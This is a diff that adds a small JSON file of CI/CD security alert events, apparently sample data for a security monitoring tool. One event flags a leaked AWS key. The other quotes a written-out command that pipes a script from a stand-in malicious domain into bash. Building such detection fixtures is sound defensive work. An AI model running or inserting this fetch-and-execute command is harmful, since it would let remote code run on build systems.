@@ -1,0 +1,45 @@
+[
+  {
+    "timestamp": "2026-09-01T10:15:22Z",
+    "source": "github_actions",
+    "pipeline": "backend-ci",
+    "repository": "Zahid-Ham/DarkShield",
+    "workflow": "Security Compliance Audit",
+    "run_id": "1849201",
+    "job": "secret_scan",
+    "stage": "build_verification",
+    "event_type": "secret_leak_detected",
+    "severity": "CRITICAL",
+    "message": "Potential AWS Access Key ID exposed in commit diff on branch main.",
+    "user": "developer_jdoe",
+    "host": "runner-ubuntu-2204-node-04",
+    "source_ip": "192.168.1.104",
+    "destination_ip": "10.0.4.12",
+    "metadata": {
+      "commit_sha": "a6cb5b5c92841",
+      "secret_type": "AWS_ACCESS_KEY",
+      "file_path": "config/aws_credentials.json",
+      "rule_id": "GITLEAKS-AWS-001"
+    }
+  },
+  {
+    "timestamp": "2026-09-01T10:18:05Z",
+    "source": "gitlab_ci",
+    "pipeline": "deployment-pipeline",
+    "repository": "corp-finance/billing-service",
+    "workflow": "Staging Deploy",
+    "run_id": 94821,
+    "job": "deploy_staging",
+    "stage": "deploy",
+    "event_type": "unauthorized_command_execution",
+    "severity": "HIGH",
+    "message": "Suspicious curl command piped into bash script during build step execution.",
+    "user": "service_deploy_bot",
+    "host": "gitlab-runner-01",
+    "source_ip": "198.51.100.45",
+    "metadata": {
+      "detected_command": "curl -s http://malicious-domain.external/payload.sh | bash",
+      "process_id": 4821
+    }
+  }
+]
